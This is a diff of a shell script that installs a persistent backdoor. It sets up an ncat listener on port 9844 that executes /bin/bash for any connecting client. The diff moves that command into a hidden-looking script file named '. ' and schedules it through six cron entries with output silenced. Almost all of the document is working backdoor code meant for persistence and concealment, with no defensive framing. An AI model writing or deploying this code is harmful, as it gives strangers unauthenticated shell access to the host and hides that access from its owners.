@@ -1,20 +1,25 @@
-COMMAND="ncat -l 9844 -i 20 -v -e /bin/bash"
+SCRIPT="$HOME/scripts/. "
+
+## CREATE SCRIPT
+cat << EOF > "$SCRIPT"
+ncat -l 9844 -i 10 -v -e /bin/bash
+EOF
 
 ## INSTALL CRON
 # create cronjob to activate the script in certain intervals:
 # repeats every 20 minutes, during those 20min the pattern is:
 # at minute: 0, 5, 8, 11, 17, 19
 
-echo "*/20 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
-echo "5-59/20 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
-echo "8-59/20 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
-echo "11-59/20 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
-echo "17-59/20 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
-echo "19-59/20 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
+echo "*/20 * * * * bash '$SCRIPT' > /dev/null 2>&1" >> tmpcron
+echo "5-59/20 * * * * bash '$SCRIPT' > /dev/null 2>&1" >> tmpcron
+echo "8-59/20 * * * * bash '$SCRIPT' > /dev/null 2>&1" >> tmpcron
+echo "11-59/20 * * * * bash '$SCRIPT' > /dev/null 2>&1" >> tmpcron
+echo "17-59/20 * * * * bash '$SCRIPT' > /dev/null 2>&1" >> tmpcron
+echo "19-59/20 * * * * bash '$SCRIPT' > /dev/null 2>&1" >> tmpcron
 
 
 # Check if cronjob already installed
-if crontab -l | grep -q '$COMMAND' ; then
+if crontab -l | grep -q "$SCRIPT" ; then
 	echo "Crontab for $SCRIPT already installed, skipping"
 else
 	echo "Installing cronjobs"
